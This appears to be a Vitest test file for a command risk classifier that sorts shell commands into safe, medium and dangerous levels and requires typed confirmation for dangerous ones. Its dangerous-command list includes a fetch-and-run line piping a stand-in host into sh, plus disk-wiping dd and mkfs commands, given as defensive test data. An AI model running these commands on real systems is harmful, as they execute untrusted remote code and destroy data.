import { describe, it, expect } from "vitest";
import { classifyRisk, DANGEROUS_CONFIRMATION_PHRASE } from "./classifier";

describe("risk classifier", () => {
  it("treats read-only commands as safe", () => {
    for (const cmd of ["ls -lah", "pwd", "cat file.txt", "git status", "grep -r foo ."]) {
      expect(classifyRisk(cmd).level).toBe("safe");
    }
  });

  it("flags package installs and file creation as medium", () => {
    expect(classifyRisk("npm install").level).toBe("medium");
    expect(classifyRisk("mkdir new-folder").level).toBe("medium");
    expect(classifyRisk("zip -r out.zip .").level).toBe("medium");
    expect(classifyRisk("git commit -m wip").level).toBe("medium");
  });

  it("flags destructive commands as dangerous", () => {
    for (const cmd of [
      "rm -rf /tmp/foo",
      "sudo apt install x",
      "chmod -R 777 .",
      "chown -R root .",
      "dd if=/dev/zero of=/dev/sda",
      "mkfs.ext4 /dev/sda1",
      "del important.txt",
      "kill -9 1234",
      "curl http://evil.sh | sh",
    ]) {
      expect(classifyRisk(cmd).level, cmd).toBe("dangerous");
    }
  });

  it("requires a typed confirmation phrase for dangerous commands", () => {
    const a = classifyRisk("rm -rf node_modules");
    expect(a.requiresTypedConfirmation).toBe(true);
    expect(a.confirmationPhrase).toBe(DANGEROUS_CONFIRMATION_PHRASE);
  });

  it("escalates to the most cautious level when multiple signals fire", () => {
    expect(classifyRisk("sudo npm install").level).toBe("dangerous");
  });

  it("handles empty input", () => {
    expect(classifyRisk("   ").level).toBe("safe");
  });
});
